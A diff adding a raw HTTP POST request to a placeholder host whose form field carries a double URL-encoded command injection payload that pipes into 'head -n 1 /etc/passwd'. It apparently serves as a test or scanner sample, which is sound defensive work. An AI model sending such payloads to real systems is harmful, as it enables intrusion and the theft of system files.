@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+Connection: close
+
+data=%257C%2Bhead%2B-n%2B1%2B%252Fetc%252Fpasswd
